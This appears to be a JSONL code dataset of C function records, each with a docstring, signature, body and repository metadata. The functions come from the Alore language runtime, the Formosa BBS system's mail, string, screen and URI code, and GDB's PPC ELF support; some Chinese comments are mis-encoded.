{"docstring": "/* Does sym refer to a valid superclass (i.e. a type that is not a primitive\n   one)? */\n", "func_signal": "ABool AIsValidSuperClass(ASymbolInfo *sym)", "code": "{\n    if (sym->type == ID_GLOBAL_CLASS) {\n        return sym != ATupleClass->sym && sym != ABooleanClass->sym;\n    } else\n        return FALSE;\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* bitop::Xor(n, m) */\n", "func_signal": "static AValue BitopXor(AThread *t, AValue *frame)", "code": "{\n    if (AIsShortInt(frame[0]) && AIsShortInt(frame[1]))\n        return AMakeIntFromValue(t, AValueToInt(frame[0]) ^\n                                 AValueToInt(frame[1]));\n    else if (AIsInt(frame[0]) && AIsInt(frame[1])) {\n        long i, len;\n\n        len = AMax(IntLen(frame[0]), IntLen(frame[1]));\n\n        frame[0] = GetLongIntDigits(t, &frame[0], len);\n        frame[1] = GetLongIntDigits(t, &frame[1], len);\n\n        for (i = 0; i < len; i++)\n            DIGIT(frame[0], i) ^= DIGIT(frame[1], i);\n\n        return MakeIntFromBinary(t, &frame[0], len);\n    } else\n        return RaiseIntExpected(t, frame);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Perform a 2's complement negation for a positive long integer (represented\n   as a Str buffer). */\n", "func_signal": "static void NegateSign(AValue v, long len)", "code": "{\n    long i = 0;\n    /* Decrement by 1. Note that since we assume the integer to be positive,\n       this will terminate. */\n    while (DIGIT(v, i)-- == 0)\n        i++;\n    /* Perform bitwise negation. */\n    for (i = 0; i < len; i++)\n        DIGIT(v, i) = ~DIGIT(v, i);\n}", "path": "src\\bitop_module.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Return the internal wrapper type corresponding to an object. Assume that the\n   object is not an instance. */\n", "func_signal": "static ATypeInfo *InternalType(AValue obj)", "code": "{\n    if (AIsStr(obj))\n        return AStrClass;\n    else if (AIsInt(obj))\n        return AIntClass;\n    else if (AIsFloat(obj))\n        return AFloatClass;\n    else if (AIsRange(obj))\n        return ARangeClass;\n    else if (AIsPair(obj))\n        return APairClass;\n    else if (AIsConstant(obj))\n        return AConstantClass;\n    else if (AIsGlobalFunction(obj)) {\n        /* obj can be a function or a primitive type object. */\n        ASymbolInfo *sym = AValueToFunction(obj)->sym;\n        if (AInternalTypeSymbol(sym) != sym)\n            return ATypeClass;\n        else\n            return AFunctionClass;\n    } else if (AIsMethod(obj))\n        return AFunctionClass;\n    else if (AIsNonSpecialType(obj))\n        return ATypeClass;\n    else {\n        AEpicInternalFailure(\"InternalType called with invalid object\");\n        return NULL;\n    }\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Return obj as an instance, wrapping it if necessary. Never raise a direct\n   exception. */\n", "func_signal": "AValue AWrapObject(AThread *t, AValue obj)", "code": "{\n    AInstance *instance;\n    ATypeInfo *type;\n\n    /* Instances do not need to be wrapped. */\n    if (AIsInstance(obj))\n        return obj;\n\n    *t->tempStack = obj;\n    instance = AAlloc(t, 2 * sizeof(AValue));\n    if (instance == NULL)\n        return AError;\n    obj = *t->tempStack;\n\n    /* Determine the corresponding wrapper class. */\n    /* IDEA: Use InternalType instead. */\n    if (AIsStr(obj))\n        type = AStrClass;\n    else if (AIsShortInt(obj) || AIsLongInt(obj))\n        type = AIntClass;\n    else if (AIsFloat(obj))\n        type = AFloatClass;\n    else if (AIsRange(obj))\n        type = ARangeClass;\n    else if (AIsPair(obj))\n        type = APairClass;\n    else if (AIsConstant(obj))\n        type = AConstantClass;\n    else if (AIsGlobalFunction(obj)) {\n        /* obj can be a function or a primitive type object. */\n        ASymbolInfo *sym = AValueToFunction(obj)->sym;\n        if (AInternalTypeSymbol(sym) != sym)\n            type = ATypeClass;\n        else\n            type = AFunctionClass;\n    } else if (AIsMethod(obj))\n        type = AFunctionClass;\n    else if (AIsNonSpecialType(obj))\n        type = ATypeClass;\n    else {\n        *t->tempStack = AZero;\n        return ARaiseMemberErrorND(t, obj, -1);\n    }\n\n    /* Initialize the wrapper object. */\n    AInitInstanceBlock(&instance->type, type);\n    instance->member[0] = *t->tempStack;\n\n    *t->tempStack = AZero;\n    return AInstanceToValue(instance);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* Compare two values for equality. Return AZero if the result is false,\n   AIntToValue(1) if true, and AError on error. */\n", "func_signal": "AValue AIsEqual(AThread *t, AValue left, AValue right)", "code": "{\n    if (AIsInstance(left)) {\n        AValue res;\n\n        if (!AGetInstanceType(AValueToInstance(left))->hasEqOverload)\n            return BoolToIntValue(left == right);\n\n        if (!AAllocTempStack_M(t, 2))\n            return AError;\n\n        t->tempStackPtr[-2] = left;\n        t->tempStackPtr[-1] = right;\n        res = ACallMethodByNum(t, AM_EQ, 1, t->tempStackPtr - 2);\n        t->tempStackPtr -= 2;\n\n        return CheckBoolean(t, res);\n    }\n\n    if (AIsInstance(right) && (AIsInt(left) || AIsFloat(left)))\n        return AIsEqual(t, right, left);\n\n    if (AIsNarrowStr(left))\n        goto StringComparison;\n\n    if (AIsFloat(left)) {\n        if (AIsFloat(right)) {\n            if (AValueToFloat(left) == AValueToFloat(right))\n                return AIntToValue(1);\n            else\n                return AZero;\n        }\n\n        if (AIsShortInt(right)) {\n            if (AValueToFloat(left) == AValueToInt(right))\n                return AIntToValue(1);\n            else\n                return AZero;\n        }\n\n        if (AIsLongInt(right)) {\n            if (AValueToFloat(left) == ALongIntToFloat(right))\n                return AIntToValue(1);\n            else\n                return AZero;\n        }\n\n        return AZero;\n    }\n\n    if (AIsLongInt(left)) {\n        if (AIsLongInt(right) && ACompareLongInt(left, right) == 0)\n            return AIntToValue(1);\n        else if (AIsFloat(right))\n            return AIsEqual(t, right, left);\n        else\n            return AZero;\n    }\n\n    if (AIsShortInt(left) && !AIsShortInt(right))\n        return AIsEqual(t, right, left);\n\n    if (AIsSubStr(left) || AIsWideStr(left))\n        goto StringComparison;\n\n    if (AIsMixedValue(left)) {\n        if ((AIsPair(left) && AIsPair(right)) ||\n            (AIsRange(left) && AIsRange(right)))\n            return IsRangeOrPairEqual(t, left, right);\n    }\n\n    return left == right ? AIntToValue(1) : AZero;\n\n  StringComparison:\n\n    {\n        int result = ACompareStrings(left, right);\n        if (result == 0)\n            return AIntToValue(1);\n        else\n            return AZero;\n    }\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/* If a direct exception has been raised at the current thread, dispatch it\n   (i.e. do not return normally but jump directly to the next exception\n   handler). Otherwise, do nothing. */\n", "func_signal": "void ADispatchException(AThread *t)", "code": "{\n    if (AIsOfType(t->exception,\n                 AGlobalByNum(AErrorClassNum[EX_MEMORY_ERROR])) == A_IS_TRUE ||\n        AIsOfType(t->exception,\n                 AGlobalByNum(AErrorClassNum[EX_VALUE_ERROR])) == A_IS_TRUE)\n        longjmp(t->context[t->contextIndex - 1].env, 1);\n}", "path": "src\\runtime.c", "repo_name": "JukkaL/alore", "stars": 34, "license": "other", "language": "c", "size": 1980}
{"docstring": "/**\n * query the offset of nth non-ANSI element in s\n * if string is less then nth, return missing blanks in negative value.\n */\n", "func_signal": "int strat_ansi(int count, const char *s)", "code": "{\n    register int mode = 0;\n    const char *os = s;\n\n    for (; count > 0 && *s; ++s)\n    {\n\t// 0 - no ansi, 1 - [, 2 - param+cmd\n\tswitch (mode)\n\t{\n\t    case 0:\n\t\tif (*s == ESC_CHR)\n\t\t    mode = 1;\n\t\telse\n\t\t    count --;\n\t\tbreak;\n\n\t    case 1:\n\t\tif (*s == '[')\n\t\t    mode = 2;\n\t\telse\n\t\t    mode = 0; // unknown command\n\t\tbreak;\n\n\t    case 2:\n\t\tif (isEscapeParam(*s))\n\t\t    continue;\n\t\telse if (isEscapeCommand(*s))\n\t\t    mode = 0;\n\t\telse\n\t\t    mode = 0;\n\t\tbreak;\n\t}\n    }\n    if (count > 0)\n\treturn -count;\n    return s - os;\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*******************************************************************\n * Read Mail Menu \u04e4HHc  C\\\u016a\n *******************************************************************/\n", "func_signal": "int m_read()", "code": "{\n\tstatic int mail_ccur = 0;\t/* the postion of cursor in mail folder */\n\tstatic struct one_key mail_comms[] =\n\t{\n\t\t{CTRL('P'), m_send},\n\t\t{'h', mail_help},\n\t\t{'r', read_article},\n\t\t{'m', mail_article},\n\t\t{'d', delete_article},\n\t\t{'t', tag_article},\n\t\t{'T', range_tag_article},\n\t\t{'E', edit_article},\n\t\t{'i', title_article},\n\t\t{'g', reserve_article},\n\t\t{'x', cross_article},\n\t\t{'U', rcmd_query},\n\t\t{'a', author_backward},\n\t\t{'A', author_forward},\n\t\t{'<', title_backward},\n\t\t{'?', title_backward},\n\t\t{'>', title_forward},\n\t\t{'/', title_forward},\n\t\t{'[', thread_backward},\n\t\t{']', thread_forward},\n\t\t{'-', resv_backward},\n\t\t{'+', resv_forward},\n#if defined(NSYSUBBS1) || defined(KHBBS) /* sarek:09/23/2001:\u042dnD */\n\t\t{CTRL('X'), capture_mail},\n#endif\n\t\t{'\\0', NULL}\n\t};\n\n\n/* kmwang: \u016aH\u0274 user H^h */\n#ifdef MAILWARN\n        pmore(MAIL_WARN, TRUE);\n#endif\n\n\tin_mail = TRUE;\t\t/* lthuang */\n\n\tdo\n\t{\n\t\tfree_wlist(&artwtop, free);\n\t\tstrcpy(tmpdir, ufile_mail);\n\n\t\tcursor_menu(4, 0, tmpdir, mail_comms, FH_SIZE, &mail_ccur,\n\t\t\t    mail_title, read_btitle,\n\t\t\t    read_entry, read_get, read_max, NULL, 1, FALSE);\n\t}\n\twhile (check_mail_num(1));\n\n\tin_mail = FALSE;\n\n\treturn C_LOAD;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/* ----------------------------------------------------- */\n/* r\u0d2b\u02ecd                                      */\n/* ----------------------------------------------------- */\n/**\n * Nr s \u0b30pgs^ t\n * @param t allocated char array\n * @param s\n */\n", "func_signal": "void str_lower(char *t, const char *s)", "code": "{\n    register unsigned char ch;\n\n    do {\n\tch = *s++;\n\t*t++ = CHAR_LOWER(ch);\n    } while (ch);\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*******************************************************************\n *\tq\"W\"P_ para O_g (d)\n *\n *\tie:\t*\t\t\t= \n *\t\tall.html\t= \n *\t\t$\t\t\t= \u032b\u1aba DEFAULT_PAGE_SIZE g\n *\t\ta-b\t\t\t= a ~ b g\n *\t\ta-\t\t\t= a ~ (a+DEFAULT_PAGE_SIZE) g\n *\t\ta-$\t\t\t= a ~ \u032b@g\n *******************************************************************/\n", "func_signal": "static BOOL\nisList(const char *para, int *start, int *end)", "code": "{\n\tchar *p, data[STRLEN];\n\tint len;\n\n\txstrncpy(data, para, sizeof(data));\n\tp = data;\n\n\tif (*p == '*'\n\t    || !strcasecmp(p, \"all.html\"))\t/* list all post */\n\t{\n\t\t*start = 1;\n\t\t*end = ALL_RECORD;\n\t}\n\telse if (*p == '$')\t/* list last 1 page */\n\t{\n\t\t*start = LAST_RECORD;\n\t\t*end = LAST_RECORD;\n\t}\n\telse\n\t{\n\t\tfor (len = strlen(p); len > 0; len--)\n\t\t\tif (!isdigit((int) *(p + len - 1))\n\t\t\t    && ((*(p + len - 1) != '-') && (*(p + len - 1) != '$')))\n\t\t\t\treturn FALSE;\n\n\t\tstrtok(p, \"-\");\n\t\t*start = atoi(p);\n\t\tp += strlen(p) + 1;\n\t\tif (*p == '$')\n\t\t\t*end = LAST_RECORD;\n\t\telse\n\t\t\t*end = atoi(p);\n\t}\n\n\t/*\n\t   we assume 100000 is a sufficient large number that\n\t   online user & post & mail number should not exceed it\n\t */\n\tif (*start == ALL_RECORD || *start == LAST_RECORD)\n\t\treturn TRUE;\n\tif (*start > 0 && *start < 100000)\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n}", "path": "bbsweb\\uri.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/* sarek:09/23/2001:\u042dnD */\n", "func_signal": "static int capture_mail(int ent, FILEHEADER *finfo, char *direct)", "code": "{\n\tchar fnori[PATHLEN];\n\n\n\tmsg(\"<<H>: APNnNH\u04a6 %s O (y/n)? [n]: \",\n\t\tCAPTURE_BOARD);\n\tif (igetkey() != 'y')\n\t{\n\t\tmsg(_msg_abort);\n\t\tgetkey();\n\t\treturn C_FOOT;\n\t}\n\n\tsetdotfile(fnori, direct, finfo->filename);\n\t/*  post on board, postpath is NULL */\n#ifdef\tUSE_THREADING\t/* syhu */\n/*\n\tif (PublishPost(fnori, curuser.userid, curuser.username, CAPTURE_BOARD,\n\t\t\"[HO]\", curuser.ident, uinfo.from, FALSE, NULL, 0,-1,-1) < 0)\n*/\n\tif (PublishPost(fnori, curuser.userid, uinfo.username, CAPTURE_BOARD,\n\t\t\"[HO]\", curuser.ident, uinfo.from, FALSE, NULL, 0,-1,-1) < 0)\n#else\n/*\n\tif (PublishPost(fnori, curuser.userid, curuser.username, CAPTURE_BOARD,\n\t\t\"[HO]\", curuser.ident, uinfo.from, FALSE, NULL, 0) < 0)\n*/\n\tif (PublishPost(fnori, curuser.userid, uinfo.username, CAPTURE_BOARD,\n\t\t\"[HO]\", curuser.ident, uinfo.from, FALSE, NULL, 0) < 0)\n#endif\n\t\tshowmsg(_msg_fail);\n\telse\n\t\tshowmsg(_msg_finish);\n\treturn C_FULL;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/**\n *  src  '\\n' \u00e7\uf9a8 '\\0'\n * @param src\n */\n", "func_signal": "void chomp(char *src)", "code": "{\n    while(*src){\n\tif (*src == '\\n')\n\t    *src = 0;\n\telse\n\t    src++;\n    }\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * Support ANSI control code, output a character onto screen buffer\n */\n", "func_signal": "int outc(register unsigned char c)", "code": "{\n#if 1\n\tstatic unsigned char lastc = '\\0';\n#endif\n\n\tif (dumb_term)\n\t{\n\t\tif (!isprint2(c))\n\t\t{\n\t\t\tif (c == '\\n')\n\t\t\t{\n\t\t\t\tochar('\\r');\n\t\t\t\tochar('\\n');\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tochar('*');\n\t\t\treturn 0;\n\t\t}\n\t\tochar(c);\n\t\treturn 0;\n\t}\n\n\tif (c == '\\n' || c == '\\r')\n\t{\t\t\t/* do the newline thing */\n\t\tif (standing)\n\t\t\tstandend();\n\t\tif (cur_pos > cur_slp->len)\n\t\t{\n\t\t\tregister int i;\n\n\t\t\tfor (i = cur_slp->len; i <= cur_pos; i++)\n\t\t\t\tcur_slp->data[i] = ' ';\n\t\t}\n\t\tcur_slp->len = cur_pos;\n\t\tcur_slp->width = cur_col;\n\t\tcur_col = 0;\n\t\tcur_pos = 0;\n\t\tif (cur_ln < t_lines)\n\t\t{\n\t\t\tcur_ln++;\n\t\t\tcur_slp = &(big_picture[(cur_ln + roll) % t_lines]);\n\t\t}\n\t\treturn 0;\n\t}\n\n\t/* deal with non-printables */\n\tif (!isprint2(c))\n\t\tc = '*';\t/* else substitute a '*' for non-printable */\n\n\tif (!show_ansi)\n\t{\n\t\tif (c == 0x1b)\n\t\t{\n\t\t\tansi_mode = TRUE;\n\t\t\treturn 0;\n\t\t}\n\t\telse if (ansi_mode)\n\t\t{\n\t\t\tif (isalpha(c))\n\t\t\t\tansi_mode = FALSE;\n\t\t\treturn 0;\n\t\t}\n\t}\n\n#if 1\n\tif (ansi_mode)\n\t{\n\t\tif (lastc == '[' && (c == '=' || c == ']'))\t/* strip netterm special escape sequences */\n\t\t{\n\t\t\tlastc = c;\n\t\t\treturn 0;\n\t\t}\n\t}\n\tlastc = c;\n#endif\n\n\tif (cur_pos >= cur_slp->len)\n\t{\n\t\tregister int i;\n\n\t\tfor (i = cur_slp->len; i < cur_pos; i++)\n\t\t\tcur_slp->data[i] = ' ';\n\t\tcur_slp->data[cur_pos] = '\\0';\t/* ? */\n\t\tcur_slp->len = cur_pos + 1;\n\t}\n\n\tif (cur_slp->data[cur_pos] != c)\n\t{\n\t\tif ((cur_slp->mode & MODIFIED) != MODIFIED)\n\t\t{\n\t\t\tcur_slp->smod = (cur_slp->emod = cur_pos);\n\t\t\tcur_slp->scmod = (cur_slp->ecmod = cur_col);\n\t\t}\n\t\tcur_slp->mode |= MODIFIED;\n\t\tif (cur_pos > cur_slp->emod)\n\t\t\tcur_slp->emod = cur_pos;\n\t\tif (cur_pos < cur_slp->smod)\n\t\t\tcur_slp->smod = cur_pos;\n\t\tcur_slp->data[cur_pos] = c;\n\t}\n\n\tcur_pos++;\n\n\tif (c == 0x1b)\n\t\tansi_mode = TRUE;\n\telse if (!ansi_mode)\n\t{\n\t\tif (cur_pos > cur_slp->emod)\n\t\t\tcur_slp->ecmod = cur_col;\n\t\tif (cur_pos < cur_slp->smod)\n\t\t\tcur_slp->scmod = cur_col;\n\t\tcur_col++;\n\t}\n\telse if (isalpha(c))\n\t\tansi_mode = FALSE;\n\n\tif (cur_col > cur_slp->width)\n\t\tcur_slp->width = cur_col;\n\tif (cur_col >= t_columns || cur_pos >= ANSILINELEN)\t/* lthuang */\n\t{\n\t\tif (standing && cur_slp->mode & STANDOUT)\n\t\t\tstandend();\n\t\tcur_col = 0;\n\t\tcur_pos = 0;\n\t\tif (cur_ln < t_lines)\n\t\t{\n\t\t\tcur_ln++;\n\t\t\tcur_slp = &(big_picture[(cur_ln + roll) % t_lines]);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "src\\screen.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/**\n * DBCS_Status(dbcstr, pos): or\ua924wm DBCS AC\n */\n", "func_signal": "int DBCS_Status(const char *dbcstr, int pos)", "code": "{\n    int sts = DBCS_ASCII;\n    const unsigned char *s = (const unsigned char*)dbcstr;\n\n    while(pos >= 0)\n    {\n\tif(sts == DBCS_LEADING)\n\t    sts = DBCS_TRAILING;\n\telse if (*s >= 0x80)\n\t{\n\t    sts = DBCS_LEADING;\n\t} else {\n\t    sts = DBCS_ASCII;\n\t}\n\ts++, pos--;\n    }\n    return sts;\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/* ----------------------------------------------------- */\n/* DBCS Bz                                         */\n/* ----------------------------------------------------- */\n", "func_signal": "void strip_nonebig5(unsigned char *str, int maxlen)", "code": "{\n  int i;\n  int len=0;\n  for(i=0;i<maxlen && str[i];i++) {\n    if(32<=str[i] && str[i]<128)\n      str[len++]=str[i];\n    else if(str[i]==255) {\n      if(i+1<maxlen)\n\tif(251<=str[i+1] && str[i+1]<=254) {\n\t  i++;\n\t  if(i+1<maxlen && str[i+1])\n\t    i++;\n\t}\n      continue;\n    } else if(str[i]&0x80) {\n      if(i+1<maxlen)\n\tif((0x40<=str[i+1] && str[i+1]<=0x7e) ||\n\t   (0xa1<=str[i+1] && str[i+1]<=0xfe)) {\n\t  str[len++]=str[i];\n\t  str[len++]=str[i+1];\n\t  i++;\n\t}\n    }\n  }\n  if(len<maxlen)\n    str[len]='\\0';\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*******************************************************************\n *\tq\"W\"P_ para O_Gi&H\u026e (@B~P_)\n *\n *\tie: M.871062060.A\t\t->yes\n *\t\tM.871062060.A.html\t->yes\n *\t\t^^         ^  ->check point\n *******************************************************************/\n", "func_signal": "static BOOL\nisPost(const char *para)", "code": "{\n\tif (strlen(para) < 13)\t/* lthuang */\n\t\treturn FALSE;\n\tif ((para[0] == 'M' || para[0] == 'D')\n\t    && para[1] == '.'\n\t    && (para[11] == '.' || para[12] == '.'))\n\t\treturn TRUE;\n\treturn FALSE;\n}", "path": "bbsweb\\uri.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/**\n * r buf \u0766hl\u0165\u0561C\n * @param buf\n */\n", "func_signal": "void trim(char *buf)", "code": "{\t\t\t\t/* remove trailing space */\n    char           *p = buf;\n\n    while (*p)\n\tp++;\n    while (--p >= buf) {\n\tif (*p == ' ')\n\t    *p = '\\0';\n\telse\n\t    break;\n    }\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * help for mail menu\n */\n", "func_signal": "static int mail_help(int ent, FILEHEADER *finfo, char *direct)", "code": "{\n\tpmore(MAIL_HELP, TRUE);\n\treturn C_FULL;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/* ----------------------------------------------------- */\n/* ANSI Bz                                         */\n/* ----------------------------------------------------- */\n", "func_signal": "int strip_blank(char *cbuf, char *buf)", "code": "{\n    for (; *buf; buf++)\n\tif (*buf != ' ')\n\t    *cbuf++ = *buf;\n    *cbuf = 0;\n    return 0;\n}", "path": "src\\string.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * grouply send mail, in cursor menu\n */\n", "func_signal": "int m_group()", "code": "{\n\tint result = -1;\n\tchar strTitle[STRLEN] = \"\";\n\n#ifdef STRICT_IDENT\n\tif (curuser.ident != 7)\n\t{\n\t\tmove(1, 0);\n\t\touts(_msg_sorry_ident);\n\t\tpressreturn();\n\t\treturn C_FULL;\n\t}\n#endif\n\n\tif (set_group() != -1 && set_article_title(strTitle) != -1)\n\t{\n\t\tchar fnameTmp[PATHLEN];\n\n\t\tsprintf(fnameTmp, \"tmp/groupmail%05d\", (int) getpid());\n\t\tunlink(fnameTmp);\n\t\tupdate_umode(SMAIL);\n\t\tif (!vedit(fnameTmp, strTitle, NULL))\n\t\t\tresult = mail_group(fnameTmp, strTitle);\n\t\tunlink(fnameTmp);\n\t}\n\tfree_wlist(&mg_wlist, free);\n\tif (result == -1)\n\t\tshowmsg(_msg_fail);\n\telse\n\t\tshowmsg(_msg_finish);\n\n\treturn C_FULL;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*******************************************************************\n *\tstrip .hmtl from M.xxxxxxx.?.html\n *\n *******************************************************************/\n", "func_signal": "static void\nstrip_html(char *fname)", "code": "{\n\tchar *p;\n\n\tif ((p = strrchr(fname, '.')) != NULL && !strcasecmp(p + 1, \"html\"))\n\t\t*p = '\\0';\n}", "path": "bbsweb\\uri.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * HH\n */\n", "func_signal": "int m_send(int ent, FILEHEADER *finfo, char *direct)", "code": "{\n\tchar strTo[STRLEN] = \"\", strTitle[STRLEN] = \"\";\n\n\n\tclear();\n\t/* fn_src: NULL, postpath: NULL */\n\tPrepareMail(NULL, strTo, strTitle);\n\tpressreturn();\n\n\treturn C_FULL;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*ARGUSED*/\n", "func_signal": "static int show_wlist(struct word *wtop)", "code": "{\n\tint x = 0, y = 3, cnt = 0;\n\tstruct word *wcur;\n\n\tmove(2, 0);\n\tclrtobot();\n\n\tfor (wcur = wtop; wcur; wcur = wcur->next)\n\t{\n\t\tif (wcur->word && wcur->word[0])\n\t\t{\n\t\t\tmove(y, x);\n\t\t\tprints(\"%d) %s\", ++cnt, wcur->word);\n\t\t\tif (++y >= b_line)\n\t\t\t{\n\t\t\t\ty = 3;\n\t\t\t\tx += 16;\n\t\t\t\tif (x >= 80)\n\t\t\t\t{\n\t\t\t\t\tpressreturn();\n\t\t\t\t\tx = 0;\n\t\t\t\t\tmove(y, x);\n\t\t\t\t\tclrtobot();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (cnt == 0)\n\t{\n\t\tmove(y, x);\n\t\touts(_msg_none);\n\t}\n\treturn cnt;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * grouply deliver mail now, not support 'uuencode' here\n */\n", "func_signal": "static int mail_group(char *fname, char *title)", "code": "{\n\tint msNew;\n\tstruct word *wcur;\n\n\tif (!mg_wlist || check_mail_num(0))\n\t\treturn -1;\n\n\tif ((msNew = CreateMailSocket()) < 0)\n\t\treturn -1;\n\n\tmsg(\"\u06e4vOsH\u01a5 (y/n) ? [n]: \");\n\tif (igetkey() == 'y')\n\t{\n\t\t/* H\u01a5 */\n\t\tsprintf(genbuf, \"[H\u01a5] -- %s\", title);\n\t\t/* TODO: check return vaule ? */\n#ifndef IGNORE_CASE\n                SendMail(msNew, fname, curuser.userid, curuser.userid, genbuf,\n\t\t\tcuruser.ident);\n#else\n                SendMail(msNew, fname, strcasecmp(curuser.fakeuserid,\ncuruser.userid)? curuser.userid:curuser.fakeuserid, curuser.userid, genbuf,\n\t\t\tcuruser.ident);\n#endif\n\t}\n\n\t/* delivery mail for the assigned list */\n\tfor (wcur = mg_wlist; wcur; wcur = wcur->next)\n\t{\n\t\tif (!wcur->word || !wcur->word[0])\n\t\t\tcontinue;\n\t\t/* TODO: check return vaule ? */\n\t\tSendMail(msNew, fname, curuser.userid, wcur->word, title,\n\t\t\tcuruser.ident);\n\t}\n\n\tCloseMailSocket(msNew);\n\treturn 0;\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*******************************************************************\n *\t URI Tq\n *\n *\t@B~P_\n *******************************************************************/\n", "func_signal": "static void\nGetURIToken(char *boardname, char *post, char *skin, const char *uri)", "code": "{\n\tchar *token;\n\tint len;\n\n#if 0\n\tfprintf(fp_out, \"[GetURIToken uri=\\\"%s\\\" len=\\\"%d\\\"]\\r\\n\", uri, strlen(uri));\n\tfflush(fp_out);\n#endif\n\n#if 0\n\tsscanf(uri, \"%[^/]/%s/%[^/]\", boardname, post, skin);\n\treturn;\n#endif\n\n\t*boardname = '\\0';\t/* lthuang */\n\t*post = '\\0';\t/* lthuang */\n\n\tif((token = strchr(uri, '/')) != NULL) /* get this as BOARDNAME */\n\t{\n\t\tlen = (token-uri+1) < BNAMELEN ? (token-uri+1) : BNAMELEN;\n\t\txstrncpy(boardname, uri, len);\n\n\t\turi = token + 1;\n\t\tif((token = strrchr(uri, '/')) != NULL)\t/* find last token */\n\t\t{\n\t\t\tlen = (token-uri+1) < PATHLEN-32 ? (token-uri+1) : PATHLEN-32;\n\t\t\txstrncpy(post, uri, len);\n\t\t\turi = token + 1;\n\t\t}\n\t}\n\t/* put uri in skin for latter use */\n\txstrncpy(skin, uri, PATHLEN-32);\n\n\t/*\n\tformat:\n\t\tskin\n\t\tboardname/skin\n\t\tboardname/post/\n\t\tboardname/post/skin\n\t\tboardname/post/post/\n\t\tboardname/post/post/skin\n\t*/\n\n#if 0\n\tfprintf(fp_out, \"[BOARDNAME=%s, post=%s, skin=%s]<br>\", boardname, post, skin);\n\tfflush(fp_out);\n#endif\n}", "path": "bbsweb\\uri.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/*\n * show title in mail folder menu\n */\n", "func_signal": "static void mail_title()", "code": "{\n\ttitle_func(_msg_mail_3, BBSTITLE);\n\touts(\"\\n\\\n(h) (Ctrl-p)gH (</>)(a/A)jM ([/])DD\\\\\u016a (U)d\u07f5oHH (T)R\\n\\\n(d)R (E)\u05e7s (m)HX (x)K (g)OdH (HOME)g ($)g \");\n#if defined(NSYSUBBS1) || defined(KHBBS) /* sarek:09/23/2001:\u042dnD */\n\touts(\"(Ctrl-X)\");\n#endif\n\touts(\"\\n\\\n\u001b[7m   s     oHH             D                                       \u001b[m\");\n}", "path": "src\\mail.c", "repo_name": "pigfoot/formosa", "stars": 35, "license": "other", "language": "c", "size": 2218}
{"docstring": "/* Tweak magic VxWorks symbols as they are loaded.  */\n", "func_signal": "static bfd_boolean\nppc_elf_vxworks_add_symbol_hook (bfd *abfd,\n\t\t\t\t struct bfd_link_info *info,\n\t\t\t\t Elf_Internal_Sym *sym,\n\t\t\t\t const char **namep ATTRIBUTE_UNUSED,\n\t\t\t\t flagword *flagsp ATTRIBUTE_UNUSED,\n\t\t\t\t asection **secp,\n\t\t\t\t bfd_vma *valp)", "code": "{\n  if (!elf_vxworks_add_symbol_hook(abfd, info, sym,namep, flagsp, secp,\n\t\t\t\t   valp))\n    return FALSE;\n\n  return ppc_elf_add_symbol_hook(abfd, info, sym,namep, flagsp, secp, valp);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
